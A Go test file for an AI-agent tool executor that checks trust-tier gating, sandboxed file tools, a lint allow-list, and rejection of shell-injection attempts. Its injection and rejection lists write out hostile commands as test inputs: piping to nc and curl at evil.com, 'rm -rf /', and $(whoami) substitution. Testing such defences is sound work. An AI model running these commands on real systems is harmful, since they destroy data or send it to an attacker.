package executor

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/c360studio/semdragons/domain"
	"github.com/c360studio/semdragons/processor/agentprogression"
	"github.com/c360studio/semstreams/agentic"
)

// TestBuiltinToolTierAlignment verifies that each tool registered by RegisterBuiltins
// enforces the trust tier documented in the trust tier table.
//
// Tier intent by tool category:
//
//	Apprentice (1-5) — read-only operations safe for any agent
//	Journeyman (6-10) — staging writes and external API access
//	Expert    (11-15) — production file writes, test execution
//	Master    (16-18) — unrestricted shell, party lead operations
func TestBuiltinToolTierAlignment(t *testing.T) {
	t.Parallel()

	cases := []struct {
		tool     string
		wantTier domain.TrustTier
		reason   string
	}{
		// Apprentice — read-only; safe for every agent regardless of level.
		{tool: "read_file", wantTier: domain.TierApprentice, reason: "read-only file access"},
		{tool: "list_directory", wantTier: domain.TierApprentice, reason: "read-only directory listing"},
		{tool: "search_text", wantTier: domain.TierApprentice, reason: "read-only text search"},
		{tool: "glob_files", wantTier: domain.TierApprentice, reason: "read-only file discovery"},
		{tool: "read_file_range", wantTier: domain.TierApprentice, reason: "read-only partial file access"},
		{tool: "web_search", wantTier: domain.TierApprentice, reason: "research capability available to all tiers"},

		// Journeyman — targeted writes and network access require demonstrated trust.
		{tool: "patch_file", wantTier: domain.TierJourneyman, reason: "targeted file edits require level 6+"},
		{tool: "http_request", wantTier: domain.TierJourneyman, reason: "network access requires level 6+"},
		{tool: "create_directory", wantTier: domain.TierJourneyman, reason: "filesystem writes require level 6+"},
		{tool: "rename_file", wantTier: domain.TierJourneyman, reason: "filesystem writes require level 6+"},
		{tool: "delete_file", wantTier: domain.TierJourneyman, reason: "destructive operations require level 6+"},

		// Expert — production-grade writes and test execution require level 11+.
		{tool: "write_file", wantTier: domain.TierExpert, reason: "full file write is a production capability"},
		{tool: "run_tests", wantTier: domain.TierExpert, reason: "test execution is a production capability"},
		{tool: "lint_check", wantTier: domain.TierExpert, reason: "lint execution is a production capability"},

		// Master — unrestricted shell and party-lead DAG operations require level 16+.
		{tool: "run_command", wantTier: domain.TierMaster, reason: "unrestricted shell requires high trust"},
		{tool: "decompose_quest", wantTier: domain.TierMaster, reason: "only party leads (Master+) can decompose quests"},
		{tool: "review_sub_quest", wantTier: domain.TierMaster, reason: "only party leads (Master+) can review sub-quests"},
	}

	reg := NewToolRegistry()
	reg.RegisterBuiltins()

	for _, tc := range cases {
		t.Run(tc.tool, func(t *testing.T) {
			t.Parallel()

			tool := reg.Get(tc.tool)
			if tool == nil {
				t.Fatalf("tool %q not found in registry after RegisterBuiltins", tc.tool)
			}

			if tool.MinTier != tc.wantTier {
				t.Errorf(
					"tool %q MinTier = %s (%d), want %s (%d): %s",
					tc.tool,
					tool.MinTier, tool.MinTier,
					tc.wantTier, tc.wantTier,
					tc.reason,
				)
			}
		})
	}
}

// TestBuiltinToolCount asserts that the total number of tools registered by
// RegisterBuiltins matches the expected count. A mismatch here means a tool
// was added (or removed) from RegisterBuiltins without updating
// TestBuiltinToolTierAlignment — update both together.
func TestBuiltinToolCount(t *testing.T) {
	t.Parallel()

	// RegisterBuiltins registers:
	//   read_file, write_file, list_directory, search_text, patch_file,
	//   http_request, run_tests, run_command           — 8 core tools
	//   decompose_quest                                 — 1 DAG lead tool
	//   review_sub_quest                               — 1 DAG review tool
	//   glob_files, read_file_range, web_search        — 3 new Apprentice tools
	//   create_directory, rename_file, delete_file     — 3 new Journeyman tools
	//   lint_check                                     — 1 new Expert tool
	//
	// graph_query is intentionally excluded — it requires a live EntityQueryFunc
	// and is registered separately via RegisterGraphQuery.
	const wantCount = 17

	reg := NewToolRegistry()
	reg.RegisterBuiltins()

	got := len(reg.ListAll())
	if got != wantCount {
		t.Errorf(
			"RegisterBuiltins registered %d tools, want %d; "+
				"update TestBuiltinToolTierAlignment to cover any new tools",
			got, wantCount,
		)
	}
}

// TestGlobFilesMatching verifies that glob_files finds files matching ** patterns.
func TestGlobFilesMatching(t *testing.T) {
	t.Parallel()

	// Build a temp directory tree:
	//   root/
	//     main.go
	//     README.md
	//     sub/
	//       util.go
	//       style.css
	//     sub/deep/
	//       handler.go
	tmpDir := t.TempDir()
	mustWriteFile(t, filepath.Join(tmpDir, "main.go"), "package main")
	mustWriteFile(t, filepath.Join(tmpDir, "README.md"), "# readme")
	mustWriteFile(t, filepath.Join(tmpDir, "sub", "util.go"), "package sub")
	mustWriteFile(t, filepath.Join(tmpDir, "sub", "style.css"), "body {}")
	mustWriteFile(t, filepath.Join(tmpDir, "sub", "deep", "handler.go"), "package deep")

	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{Tier: domain.TierApprentice}
	quest := &domain.Quest{}

	t.Run("recursive go files", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("glob_files", map[string]any{
			"pattern":      "**/*.go",
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "main.go")
		assertContains(t, result.Content, "util.go")
		assertContains(t, result.Content, "handler.go")
		assertNotContains(t, result.Content, "README.md")
		assertNotContains(t, result.Content, "style.css")
	})

	t.Run("root-level only", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("glob_files", map[string]any{
			"pattern":      "*.go",
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "main.go")
		assertNotContains(t, result.Content, "util.go")
	})

	t.Run("no matches returns helpful message", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("glob_files", map[string]any{
			"pattern":      "**/*.rs",
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "No files matched")
	})
}

// TestSearchTextRegex verifies that search_text works in regex mode.
func TestSearchTextRegex(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	mustWriteFile(t, filepath.Join(tmpDir, "sample.txt"),
		"foo123\nbar456\nbaz789\nFOO999\n")

	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{Tier: domain.TierApprentice}
	quest := &domain.Quest{}

	t.Run("regex matches digits", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("search_text", map[string]any{
			"pattern":      "foo[0-9]+",
			"path":         filepath.Join(tmpDir, "sample.txt"),
			"regex":        true,
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "foo123")
		assertNotContains(t, result.Content, "bar456")
		// Case-sensitive by default — FOO999 should not match foo[0-9]+
		assertNotContains(t, result.Content, "FOO999")
	})

	t.Run("invalid regex returns error", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("search_text", map[string]any{
			"pattern":      "[invalid",
			"path":         filepath.Join(tmpDir, "sample.txt"),
			"regex":        true,
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error for invalid regex, got none")
		}
		assertContains(t, result.Error, "invalid regex")
	})
}

// TestSearchTextFileGlob verifies that the file_glob parameter filters files.
func TestSearchTextFileGlob(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	mustWriteFile(t, filepath.Join(tmpDir, "main.go"), "package main // hello")
	mustWriteFile(t, filepath.Join(tmpDir, "main.ts"), "// hello from ts")
	mustWriteFile(t, filepath.Join(tmpDir, "notes.md"), "hello notes")

	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{Tier: domain.TierApprentice}
	quest := &domain.Quest{}

	call := makeToolCall("search_text", map[string]any{
		"pattern":      "hello",
		"path":         tmpDir,
		"file_glob":    "*.go",
		"_sandbox_dir": tmpDir,
	})
	result := reg.Execute(context.Background(), call, quest, agent)
	if result.Error != "" {
		t.Fatalf("unexpected error: %s", result.Error)
	}
	assertContains(t, result.Content, "main.go")
	assertNotContains(t, result.Content, "main.ts")
	assertNotContains(t, result.Content, "notes.md")
}

// TestSearchTextContextLines verifies that context_lines shows surrounding lines.
func TestSearchTextContextLines(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	content := strings.Join([]string{
		"line one",
		"line two",
		"TARGET line",
		"line four",
		"line five",
	}, "\n")
	mustWriteFile(t, filepath.Join(tmpDir, "data.txt"), content)

	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{Tier: domain.TierApprentice}
	quest := &domain.Quest{}

	call := makeToolCall("search_text", map[string]any{
		"pattern":       "TARGET",
		"path":          filepath.Join(tmpDir, "data.txt"),
		"context_lines": float64(1),
		"_sandbox_dir":  tmpDir,
	})
	result := reg.Execute(context.Background(), call, quest, agent)
	if result.Error != "" {
		t.Fatalf("unexpected error: %s", result.Error)
	}
	assertContains(t, result.Content, "line two")   // one line before
	assertContains(t, result.Content, "TARGET line") // the match
	assertContains(t, result.Content, "line four")  // one line after
	assertNotContains(t, result.Content, "line one") // outside context
}

// TestReadFileRange verifies that read_file_range returns the requested lines.
func TestReadFileRange(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	var lines []string
	for i := 1; i <= 20; i++ {
		lines = append(lines, fmt.Sprintf("line %02d", i))
	}
	mustWriteFile(t, filepath.Join(tmpDir, "big.txt"), strings.Join(lines, "\n"))

	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{Tier: domain.TierApprentice}
	quest := &domain.Quest{}

	t.Run("reads specified range", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("read_file_range", map[string]any{
			"path":         filepath.Join(tmpDir, "big.txt"),
			"start_line":   float64(5),
			"end_line":     float64(10),
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		for i := 5; i <= 10; i++ {
			assertContains(t, result.Content, fmt.Sprintf("line %02d", i))
		}
		// Lines outside the range must not appear.
		assertNotContains(t, result.Content, "line 04")
		assertNotContains(t, result.Content, "line 11")
	})

	t.Run("defaults end_line to start + 100", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("read_file_range", map[string]any{
			"path":         filepath.Join(tmpDir, "big.txt"),
			"start_line":   float64(1),
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "line 01")
		assertContains(t, result.Content, "line 20")
	})

	t.Run("returns message when start beyond EOF", func(t *testing.T) {
		t.Parallel()
		call := makeToolCall("read_file_range", map[string]any{
			"path":         filepath.Join(tmpDir, "big.txt"),
			"start_line":   float64(999),
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		assertContains(t, result.Content, "fewer than")
	})
}

// TestLintCheckAllowedPrefixes verifies that lint_check enforces the allowed-prefix list.
func TestLintCheckAllowedPrefixes(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{
		Tier: domain.TierExpert,
		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
			domain.SkillCodeReview: {Level: domain.ProficiencyNovice},
		},
	}
	quest := &domain.Quest{}

	allowed := []string{
		"go vet ./...",
		"golangci-lint run",
		"revive ./...",
		"eslint src/",
		"npx eslint .",
		"npm run lint",
		"make lint",
		"pylint mymodule",
		"flake8 .",
		"mypy src/",
		"ruff check .",
		"cargo clippy -- -D warnings",
		"dotnet format --verify-no-changes",
	}
	rejected := []string{
		"rm -rf /",
		"curl http://evil.com",
		"go build ./...",
		"npm install",
		"python manage.py migrate",
	}

	for _, cmd := range allowed {
		t.Run("allowed:"+cmd, func(t *testing.T) {
			t.Parallel()
			call := makeToolCall("lint_check", map[string]any{
				"command":      cmd,
				"_sandbox_dir": tmpDir,
			})
			result := reg.Execute(context.Background(), call, quest, agent)
			// The command may fail (tool not installed) but must NOT return a
			// "not allowed" error.
			if strings.Contains(result.Error, "lint_check only allows") {
				t.Errorf("command %q was incorrectly rejected: %s", cmd, result.Error)
			}
		})
	}

	for _, cmd := range rejected {
		t.Run("rejected:"+cmd, func(t *testing.T) {
			t.Parallel()
			call := makeToolCall("lint_check", map[string]any{
				"command":      cmd,
				"_sandbox_dir": tmpDir,
			})
			result := reg.Execute(context.Background(), call, quest, agent)
			if !strings.Contains(result.Error, "lint_check only allows") {
				t.Errorf("command %q should have been rejected, got error: %q, content: %q", cmd, result.Error, result.Content)
			}
		})
	}
}

// TestDeleteFileHandler verifies delete_file removes files and rejects directories.
func TestDeleteFileHandler(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{
		Tier: domain.TierJourneyman,
		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
			domain.SkillCodeGen: {Level: domain.ProficiencyNovice},
		},
	}
	quest := &domain.Quest{}

	t.Run("deletes existing file", func(t *testing.T) {
		t.Parallel()
		filePath := filepath.Join(tmpDir, "todelete.txt")
		mustWriteFile(t, filePath, "bye")

		call := makeToolCall("delete_file", map[string]any{
			"path":         filePath,
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error != "" {
			t.Fatalf("unexpected error: %s", result.Error)
		}
		if _, err := os.Stat(filePath); !os.IsNotExist(err) {
			t.Error("file still exists after delete")
		}
	})

	t.Run("rejects directory deletion", func(t *testing.T) {
		t.Parallel()
		dirPath := filepath.Join(tmpDir, "keepme")
		if err := os.MkdirAll(dirPath, 0755); err != nil {
			t.Fatalf("setup: %v", err)
		}

		call := makeToolCall("delete_file", map[string]any{
			"path":         dirPath,
			"_sandbox_dir": tmpDir,
		})
		result := reg.Execute(context.Background(), call, quest, agent)
		if result.Error == "" {
			t.Fatal("expected error when deleting directory, got none")
		}
		assertContains(t, result.Error, "cannot delete directories")
	})
}

// TestRenameFileHandler verifies rename_file moves a file to a new path.
func TestRenameFileHandler(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{
		Tier: domain.TierJourneyman,
		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
			domain.SkillCodeGen: {Level: domain.ProficiencyNovice},
		},
	}
	quest := &domain.Quest{}

	oldPath := filepath.Join(tmpDir, "old.txt")
	newPath := filepath.Join(tmpDir, "new.txt")
	mustWriteFile(t, oldPath, "content")

	call := makeToolCall("rename_file", map[string]any{
		"old_path":     oldPath,
		"new_path":     newPath,
		"_sandbox_dir": tmpDir,
	})
	result := reg.Execute(context.Background(), call, quest, agent)
	if result.Error != "" {
		t.Fatalf("unexpected error: %s", result.Error)
	}

	if _, err := os.Stat(oldPath); !os.IsNotExist(err) {
		t.Error("old path still exists after rename")
	}
	if _, err := os.Stat(newPath); err != nil {
		t.Errorf("new path not found after rename: %v", err)
	}
}

// TestShellMetacharacterInjection verifies that run_tests and lint_check
// reject commands with shell metacharacters that could enable command chaining.
func TestShellMetacharacterInjection(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{
		Tier: domain.TierExpert,
		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
			domain.SkillCodeGen:    {Level: domain.ProficiencyNovice},
			domain.SkillCodeReview: {Level: domain.ProficiencyNovice},
		},
	}
	quest := &domain.Quest{}

	injections := []string{
		"go test ./... ; curl http://evil.com",
		"go test ./... && rm -rf /",
		"go test ./... || echo pwned",
		"go test ./... | nc evil.com 1234",
		"go test $(whoami)",
		"go test `id`",
		"go test ./... > /tmp/exfil",
		"go test ./... < /dev/null",
	}

	for _, cmd := range injections {
		t.Run("run_tests:"+cmd, func(t *testing.T) {
			t.Parallel()
			call := makeToolCall("run_tests", map[string]any{
				"command":      cmd,
				"_sandbox_dir": tmpDir,
			})
			result := reg.Execute(context.Background(), call, quest, agent)
			assertContains(t, result.Error, "shell metacharacters")
		})
	}

	lintInjections := []string{
		"go vet ./... ; whoami",
		"eslint . && curl evil.com",
		"make lint | tee /tmp/out",
	}

	for _, cmd := range lintInjections {
		t.Run("lint_check:"+cmd, func(t *testing.T) {
			t.Parallel()
			call := makeToolCall("lint_check", map[string]any{
				"command":      cmd,
				"_sandbox_dir": tmpDir,
			})
			result := reg.Execute(context.Background(), call, quest, agent)
			assertContains(t, result.Error, "shell metacharacters")
		})
	}
}

// TestRenameFileRejectsDirectories verifies rename_file refuses to operate on directories.
func TestRenameFileRejectsDirectories(t *testing.T) {
	t.Parallel()

	tmpDir := t.TempDir()
	reg := NewToolRegistryWithSandbox(tmpDir)
	reg.RegisterBuiltins()

	agent := &agentprogression.Agent{
		Tier: domain.TierJourneyman,
		SkillProficiencies: map[domain.SkillTag]domain.SkillProficiency{
			domain.SkillCodeGen: {Level: domain.ProficiencyNovice},
		},
	}
	quest := &domain.Quest{}

	dirPath := filepath.Join(tmpDir, "mydir")
	if err := os.MkdirAll(dirPath, 0755); err != nil {
		t.Fatalf("setup: %v", err)
	}

	call := makeToolCall("rename_file", map[string]any{
		"old_path":     dirPath,
		"new_path":     filepath.Join(tmpDir, "renamed"),
		"_sandbox_dir": tmpDir,
	})
	result := reg.Execute(context.Background(), call, quest, agent)
	if result.Error == "" {
		t.Fatal("expected error when renaming directory, got none")
	}
	assertContains(t, result.Error, "files only")
}

// =============================================================================
// Helpers
// =============================================================================

// mustWriteFile creates intermediate directories and writes content to path.
func mustWriteFile(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
		t.Fatalf("mustWriteFile MkdirAll: %v", err)
	}
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatalf("mustWriteFile WriteFile: %v", err)
	}
}

// makeToolCall constructs a minimal agentic.ToolCall for testing handlers directly.
func makeToolCall(name string, args map[string]any) agentic.ToolCall {
	return agentic.ToolCall{
		ID:        "test-call-id",
		Name:      name,
		Arguments: args,
	}
}

func assertContains(t *testing.T, s, substr string) {
	t.Helper()
	if !strings.Contains(s, substr) {
		t.Errorf("expected %q to contain %q", s, substr)
	}
}

func assertNotContains(t *testing.T, s, substr string) {
	t.Helper()
	if strings.Contains(s, substr) {
		t.Errorf("expected %q NOT to contain %q", s, substr)
	}
}
